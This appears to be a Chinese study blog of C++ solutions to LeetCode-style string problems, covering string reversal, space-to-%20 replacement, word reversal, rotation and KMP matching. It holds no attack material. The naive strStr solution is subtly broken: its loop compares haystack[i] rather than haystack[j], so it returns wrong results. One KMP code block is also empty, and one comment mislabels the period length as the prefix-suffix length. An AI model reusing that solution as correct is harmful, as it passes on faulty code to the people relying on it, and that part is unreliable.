<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">reverseStr</span><span class="params">(string s, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i += (<span class="number">2</span>*k)) &#123;</span><br><span class="line">            <span class="comment">// 1. 每隔 2k 个字符的前 k 个字符进行反转</span></span><br><span class="line">            <span class="comment">// 2. 剩余字符小于 2k 但大于或等于 k 个，则反转前 k 个字符</span></span><br><span class="line">            <span class="keyword">if</span> (i + k &lt;= s.<span class="built_in">size</span>()) &#123;</span><br><span class="line">                <span class="built_in">reverse</span>(s.<span class="built_in">begin</span>()+i, s.<span class="built_in">begin</span>()+i+k);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 3. 剩余字符少于 k 个，则将剩余字符全部反转。</span></span><br><span class="line">                <span class="built_in">reverse</span>(s.<span class="built_in">begin</span>()+i, s.<span class="built_in">end</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(string&amp; s, <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = start, j = end; i &lt; j; i++, j--) &#123;</span><br><span class="line">            <span class="built_in">swap</span>(s[i], s[j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">reverseStr</span><span class="params">(string s, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i += (<span class="number">2</span> * k)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i + k &lt;= s.<span class="built_in">size</span>()) &#123;</span><br><span class="line">                <span class="built_in">reverse</span>(s, i, i+k<span class="number">-1</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">reverse</span>(s, i, s.<span class="built_in">size</span>()<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="剑指-Offer-05-替换空格——-20"><a href="#剑指-Offer-05-替换空格——-20" class="headerlink" title="剑指 Offer 05 替换空格——%20"></a>剑指 Offer 05 替换空格——%20</h3>请实现一个函数，把字符串 s 中的每个空格替换成”%20”</li>
</ul>
<p><strong>法一：先扩容，从后向前移动</strong></p>
<pre><code>如果想把这道题目做到极致，就不要只用额外的辅助空间了！
首先扩充数组到每个空格替换成&quot;%20&quot;之后的大小。
然后从后向前替换空格，也就是双指针法，过程如下：
i指向新长度的末尾，j指向旧长度的末尾。
</code></pre>
<p><strong>很多数组填充类的问题，都可以【预先给数组扩容】待填充后的大小，然后在【从后向前操作】。</strong></p>
<p><img src="https://img-blog.csdnimg.cn/c9feb80fa01c4481afcde9951aea2ba8.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    O(n)</span></span><br><span class="line"><span class="comment">    O(1)  扩容：s.resize(s.size() + count*2);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">replaceSpace</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>; <span class="comment">// 统计空格的个数</span></span><br><span class="line">        <span class="keyword">int</span> sOldSize = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s[i] == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 扩容：即每个空格替换成&quot;%20&quot;之后的大小</span></span><br><span class="line">        s.<span class="built_in">resize</span>(s.<span class="built_in">size</span>() + count * <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">int</span> sNewSize = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="comment">// 从后向前将空格替换为&quot;%20&quot;</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=sNewSize<span class="number">-1</span>, j=sOldSize<span class="number">-1</span>; j&lt;i; i--,j--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s[j] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                s[i] = s[j];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                s[i] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                s[i - <span class="number">1</span>] = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">                s[i - <span class="number">2</span>] = <span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">                i -= <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>法二：额外空间</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//额外空间：string array; 使用push_back()</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">replaceSpace</span><span class="params">(string s)</span> </span>&#123;     <span class="comment">//字符数组</span></span><br><span class="line">        string array;   <span class="comment">//存储结果</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;c : s)&#123;   <span class="comment">//遍历原字符串</span></span><br><span class="line">            <span class="keyword">if</span>(c == <span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">                array.<span class="built_in">push_back</span>(<span class="string">&#x27;%&#x27;</span>);</span><br><span class="line">                array.<span class="built_in">push_back</span>(<span class="string">&#x27;2&#x27;</span>);</span><br><span class="line">                array.<span class="built_in">push_back</span>(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                array.<span class="built_in">push_back</span>(c);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> array;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="151-反转字符串中的单词"><a href="#151-反转字符串中的单词" class="headerlink" title="151 反转字符串中的单词"></a>151 反转字符串中的单词</h3><p>给你一个字符串 s ，请你【反转字符串中 单词 的顺序】。<br>单词 是由非空格字符组成的字符串。s 中使用至少一个空格将字符串中的 单词 分隔开。<br>返回 单词 顺序颠倒且 单词 之间用单个空格连接的结果字符串。【返回字符串，且不包括多余空格】<br>注意：输入字符串 s中可能会存在【前导空格、尾随空格或者单词间的多个空格】。<br><strong>不要使用辅助空间，空间复杂度要求为O(1)</strong></p>
<pre><code>1.移除多余空格
2.将整个字符串反转
3.将每个单词反转
</code></pre>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:<span class="comment">//翻转，区间写法：左闭右闭 []</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(string&amp; s, <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span></span>&#123; </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = start, j = end; i &lt; j; i++, j--) &#123;</span><br><span class="line">            <span class="built_in">swap</span>(s[i], s[j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//去除所有空格并在相邻单词之间添加1空格, 快慢指针</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">removeExtraSpaces</span><span class="params">(string&amp; s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> slow = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); ++i) &#123; </span><br><span class="line">            <span class="keyword">if</span> (s[i] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (slow != <span class="number">0</span>) s[slow++] = <span class="string">&#x27; &#x27;</span>; <span class="comment">//手动控制空格，给单词之间添加空格。slow != 0说明不是第一个单词，需要在单词前添加空格。</span></span><br><span class="line">                <span class="keyword">while</span> (i &lt; s.<span class="built_in">size</span>() &amp;&amp; s[i] != <span class="string">&#x27; &#x27;</span>) &#123; <span class="comment">//补上该单词，遇到空格说明单词结束。</span></span><br><span class="line">                    s[slow++] = s[i++];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        s.<span class="built_in">resize</span>(slow); <span class="comment">//slow的大小即为去除多余空格后的大小。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">reverseWords</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">removeExtraSpaces</span>(s);<span class="comment">//去空格</span></span><br><span class="line">        <span class="built_in">reverse</span>(s, <span class="number">0</span>, s.<span class="built_in">size</span>()<span class="number">-1</span>);<span class="comment">//反转整串</span></span><br><span class="line">        <span class="keyword">int</span> start = <span class="number">0</span>; <span class="comment">//removeExtraSpaces后保证第一个单词的开始下标一定是0。</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= s.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i==s.<span class="built_in">size</span>() || s[i]==<span class="string">&#x27; &#x27;</span>) &#123; <span class="comment">//到达空格或者串尾，说明一个单词结束。进行翻转。</span></span><br><span class="line">                <span class="built_in">reverse</span>(s, start, i - <span class="number">1</span>);</span><br><span class="line">                start = i + <span class="number">1</span>; <span class="comment">//更新下一个单词的开始下标start</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    双端队列</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">reverseWords</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>, right = s.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="comment">// 去掉 【开头空格】</span></span><br><span class="line">        <span class="keyword">while</span> (left &lt;= right &amp;&amp; s[left] == <span class="string">&#x27; &#x27;</span>) </span><br><span class="line">            ++left;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 去掉【末尾空格】</span></span><br><span class="line">        <span class="keyword">while</span> (left &lt;= right &amp;&amp; s[right] == <span class="string">&#x27; &#x27;</span>)    </span><br><span class="line">            --right;</span><br><span class="line">        <span class="comment">//双端队列</span></span><br><span class="line">        deque&lt;string&gt; d;</span><br><span class="line">        string word;</span><br><span class="line">        <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">            <span class="keyword">char</span> c = s[left];</span><br><span class="line">            <span class="keyword">if</span> (word.<span class="built_in">size</span>() &amp;&amp; c == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                <span class="comment">// 将单词 push 到队列的头部</span></span><br><span class="line">                d.<span class="built_in">push_front</span>(<span class="built_in">move</span>(word));</span><br><span class="line">                word = <span class="string">&quot;&quot;</span>;<span class="comment">//再次置空</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (c != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                word += c;<span class="comment">//word存入单词</span></span><br><span class="line">            &#125;</span><br><span class="line">            ++left;</span><br><span class="line">        &#125;</span><br><span class="line">        d.<span class="built_in">push_front</span>(<span class="built_in">move</span>(word));</span><br><span class="line">        </span><br><span class="line">        string ans;</span><br><span class="line">        <span class="keyword">while</span> (!d.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            ans += d.<span class="built_in">front</span>();</span><br><span class="line">            d.<span class="built_in">pop_front</span>();</span><br><span class="line">            <span class="keyword">if</span> (!d.<span class="built_in">empty</span>()) </span><br><span class="line">                ans += <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="剑指-Offer-58-II-左旋转字符串"><a href="#剑指-Offer-58-II-左旋转字符串" class="headerlink" title="剑指 Offer 58 - II. 左旋转字符串"></a>剑指 Offer 58 - II. 左旋转字符串</h3><p>字符串的左旋转操作是把字符串前面的若干个字符转移到字符串的尾部。比如，输入字符串”abcdefg”和数字2，该函数将返回左旋转两位得到的结果”cdefgab”。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    双指针</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">reverseLeftWords</span><span class="params">(string s, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        s.<span class="built_in">resize</span>(s.<span class="built_in">size</span>()+n);<span class="comment">//扩容</span></span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>, r = s.<span class="built_in">size</span>()-n;</span><br><span class="line">        <span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(k&lt;n)&#123;</span><br><span class="line">            s[r] = s[l];</span><br><span class="line">            l++;</span><br><span class="line">            r++;</span><br><span class="line">            k++;</span><br><span class="line">        &#125;</span><br><span class="line">        s.<span class="built_in">erase</span>(<span class="number">0</span>,n);<span class="comment">//删去 前n空间</span></span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/4065a87308d74e788c76a54081c6695d.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">reverseLeftWords</span><span class="params">(string s, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">reverse</span>(s.<span class="built_in">begin</span>(),s.<span class="built_in">begin</span>()+n);</span><br><span class="line">        <span class="built_in">reverse</span>(s.<span class="built_in">begin</span>()+n,s.<span class="built_in">end</span>());</span><br><span class="line">        <span class="built_in">reverse</span>(s.<span class="built_in">begin</span>(),s.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="KMP算法——连续子串"><a href="#KMP算法——连续子串" class="headerlink" title="KMP算法——连续子串"></a>KMP算法——连续子串</h2><ul>
<li><strong>前缀表</strong>是用来回退的，它记录了<strong>模式串与主串(文本串)不匹配(发生冲突)的时候，模式串应该从哪里开始重新匹配</strong></li>
<li>eg: 求 最长相等前后缀 aabaaf<ul>
<li>【前缀】：不包含最后一个字符的所有以第一个字符开头的连续子串<ul>
<li>a,aa,aab,aaba,aabaa</li>
</ul>
</li>
<li>【后缀】：不包含第一个字符的所有以最后一个字符结尾的连续子串<ul>
<li>f,af,aaf,baaf,abaaf</li>
</ul>
</li>
<li>a:0 aa:1 aab:0 aaba:1 aabaa:2 aabaaf:0</li>
<li>next[]={0,1,0,1,2,0}【最长相等前后缀长度】</li>
</ul>
</li>
</ul>
<p><strong>说明：</strong><br>串：    aabaabaaf<br>模式串：aabaaf<br>依次匹配，模式串f前的字符都正确匹配，当匹配到模式串的f时，匹配有误，此时查看【前缀表】，f前一个字符a所对应的数字是2，则下一次直接从模式串下标为2的位置开始匹配，即模式串的b开始，依次匹配子串，发现匹配成功。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    初始化、处理前后缀不同情况、处理前后缀相同情况，、next数组更新</span></span><br><span class="line"><span class="comment">    i 后缀末尾位置</span></span><br><span class="line"><span class="comment">    j 前缀末尾位置</span></span><br><span class="line"><span class="comment">    初始化：</span></span><br><span class="line"><span class="comment">        j=0;</span></span><br><span class="line"><span class="comment">        next[0]=0;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="28-找出字符串中第一个匹配项的下标（KMP）"><a href="#28-找出字符串中第一个匹配项的下标（KMP）" class="headerlink" title="28 找出字符串中第一个匹配项的下标（KMP）"></a>28 找出字符串中第一个匹配项的下标（KMP）</h3><p>给你两个字符串 haystack 和 needle ，请你在 haystack 字符串中找出 needle 字符串的第一个匹配项的下标（下标从 0 开始）。如果 needle 不是 haystack 的一部分，则返回 -1 。<br><strong>法一：朴素匹配</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    枚举原串 haystack 中的每个字符作为「发起点」，每次从原串的「发起点」和匹配串的「首位」开始尝试匹配：</span></span><br><span class="line"><span class="comment">    总共可能的匹配串有 (n-m) 个</span></span><br><span class="line"><span class="comment">    O((n-m)*m)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">strStr</span><span class="params">(string haystack, string needle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = haystack.<span class="built_in">size</span>();<span class="comment">//原串</span></span><br><span class="line">        <span class="keyword">int</span> m = needle.<span class="built_in">size</span>();<span class="comment">//子串</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=n-m;i++)&#123;<span class="comment">//原串中最多匹配n-m次</span></span><br><span class="line">            <span class="keyword">int</span> j=i, k=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span>(k&lt;m &amp;&amp; haystack[i]==needle[k])&#123;</span><br><span class="line">                j++;</span><br><span class="line">                k++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(k==m)</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>法二：KMP算法</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    O(m+n)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">strStr</span><span class="params">(string h, string need)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = h.<span class="built_in">size</span>();<span class="comment">//原串</span></span><br><span class="line">        <span class="keyword">int</span> m = need.<span class="built_in">size</span>();<span class="comment">//子串</span></span><br><span class="line">        <span class="keyword">if</span>(m==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        h.<span class="built_in">insert</span>(h.<span class="built_in">begin</span>(),<span class="string">&#x27; &#x27;</span>);<span class="comment">//哨兵</span></span><br><span class="line">        need.<span class="built_in">insert</span>(need.<span class="built_in">begin</span>(),<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        <span class="comment">//构建 next[]数组</span></span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">next</span><span class="params">(m+<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>,j=<span class="number">0</span>;i&lt;=m;i++)&#123;</span><br><span class="line">            <span class="keyword">while</span>(j &amp;&amp; need[i]!=need[j+<span class="number">1</span>])</span><br><span class="line">                j = next[j];</span><br><span class="line">            <span class="keyword">if</span>(need[i]==need[j+<span class="number">1</span>])</span><br><span class="line">                j++;</span><br><span class="line">            next[i] = j;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>,j=<span class="number">0</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="keyword">while</span>(j &amp;&amp; h[i]!=need[j+<span class="number">1</span>])</span><br><span class="line">                j = next[j];</span><br><span class="line">            <span class="keyword">if</span>(h[i]==need[j+<span class="number">1</span>])</span><br><span class="line">                j++;</span><br><span class="line">            <span class="keyword">if</span>(j==m)</span><br><span class="line">                <span class="keyword">return</span> i-m;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="459-重复的子字符串"><a href="#459-重复的子字符串" class="headerlink" title="459 重复的子字符串"></a>459 重复的子字符串</h3><p>给定一个非空的字符串 s ，检查是否可以通过由它的一个子串重复多次构成。<br><strong>法一：移动匹配</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">repeatedSubstringPattern</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        string t = s + s;</span><br><span class="line">        t.<span class="built_in">erase</span>(t.<span class="built_in">begin</span>()); t.<span class="built_in">erase</span>(t.<span class="built_in">end</span>()<span class="number">-1</span>); <span class="comment">// 掐头去尾</span></span><br><span class="line">        <span class="keyword">if</span> (t.<span class="built_in">find</span>(s) != std::string::npos) </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//r</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">//return (s + s).find(s, 1) != s.size();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>法二：KMP</strong><br><strong>重复的子字符串：是最长相等前后缀不包含的那个字串</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//前缀表-1</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">getNext</span><span class="params">(<span class="keyword">int</span>* next, <span class="keyword">const</span> string&amp; s)</span></span>&#123;</span><br><span class="line">        next[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;s.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">            <span class="keyword">while</span>(j&gt;=<span class="number">0</span> &amp;&amp; s[i]!=s[j+<span class="number">1</span>])&#123;</span><br><span class="line">                j = next[j];<span class="comment">//这里</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==s[j+<span class="number">1</span>])&#123;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            next[i] = j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">repeatedSubstringPattern</span> <span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (s.<span class="built_in">size</span>()==<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> next[s.<span class="built_in">size</span>()];</span><br><span class="line">        <span class="built_in">getNext</span>(next, s);</span><br><span class="line">        <span class="keyword">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="comment">//最长相等前后缀的长度:len-(next[len-1]+1)</span></span><br><span class="line">        <span class="keyword">if</span> (next[len<span class="number">-1</span>]!=<span class="number">-1</span> &amp;&amp; len%(len-(next[len<span class="number">-1</span>]+<span class="number">1</span>))==<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//前缀表不改动!!!!!!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">getNext</span> <span class="params">(<span class="keyword">int</span>* next, <span class="keyword">const</span> string&amp; s)</span></span>&#123;</span><br><span class="line">        next[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;s.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">            <span class="keyword">while</span>(j&gt;<span class="number">0</span> &amp;&amp; s[i]!=s[j]) &#123;</span><br><span class="line">                j = next[j<span class="number">-1</span>];<span class="comment">//这里</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==s[j]) &#123;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            next[i] = j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">repeatedSubstringPattern</span> <span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (s.<span class="built_in">size</span>()==<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> next[s.<span class="built_in">size</span>()];</span><br><span class="line">        <span class="built_in">getNext</span>(next, s);</span><br><span class="line">        <span class="keyword">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="comment">//最长相等前后缀的长度:len-(next[len-1])</span></span><br><span class="line">        <span class="keyword">if</span> (next[len<span class="number">-1</span>]!=<span class="number">0</span> &amp;&amp; len%(len-(next[len<span class="number">-1</span>]))==<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="524-通过删除字母匹配到字典里最长单词——不连续"><a href="#524-通过删除字母匹配到字典里最长单词——不连续" class="headerlink" title="524 通过删除字母匹配到字典里最长单词——不连续"></a>524 通过删除字母匹配到字典里最长单词——不连续</h3><p>给你一个字符串 s 和一个字符串数组 dictionary ，找出并返回 dictionary 中<strong>最长的</strong>字符串，该字符串可以<strong>通过删除 s 中的某些字符</strong>得到。【不是 s的字串】<br>【如果答案不止一个】，返回<strong>长度最长</strong>且<strong>字母序最小</strong>的字符串。如果答案不存在，则返回空字符串。</p>
